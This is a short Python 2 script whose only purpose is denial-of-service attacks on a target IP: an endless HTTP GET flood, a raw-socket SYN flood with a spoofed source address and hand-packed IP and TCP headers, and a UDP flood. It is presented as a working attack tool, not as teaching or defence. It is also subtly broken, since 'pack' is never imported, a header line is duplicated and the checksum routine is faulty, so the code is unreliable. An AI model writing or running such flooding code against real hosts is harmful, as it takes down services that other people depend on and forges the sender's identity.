import socket
from time import sleep
import random


def dos(ip, attack_type='simple'):
    if attack_type == 'simple':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 80))
        while 1:
            try:
                s.send('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 10000)))
            except:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 80))

    elif attack_type == 'syn_flood':
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        source_ip = '1.2.3.4'
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        packet = ''

        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 48
        ip_id = 54321
        ip_frag_off = 0

        ip_ttl = 128
        ip_proto = 6
        ip_check = 14840
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(ip)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                         ip_id, ip_frag_off, ip_ttl,   6, ip_check, ip_saddr, ip_daddr)
        ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                         ip_id, ip_frag_off, ip_ttl,   6, ip_check, ip_saddr, ip_daddr)

        tcp_source = 1234
        tcp_dest = 8000
        tcp_seq = 524
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(8192)
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + \
            (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

        tcp_header = pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                          tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)

        data = 'GET /abc'

        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(ip)
        placeholder = 0
        protocol = 6
        tcp_length = len(tcp_header) + len(data)

        psh = pack('!4s4sBBH', source_address,
                   dest_address, placeholder, 6, tcp_length)
        psh = psh + tcp_header + data

        tcp_check = checksum(psh)
        print tcp_check, "before inducing checksum"

        tcp_header = pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
                          tcp_flags,  tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)
        tcp_header = tcp_header
        packet = ip_header + tcp_header

        while 1:
            s.sendto(packet, (ip, 80))

    elif attack_type == 'udp_flood':
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while 1:
            s.sendto('a' * 256, (ip, 80))


def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i + 1]) << 8)
        s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        s = ~s & 0xffff
    return s
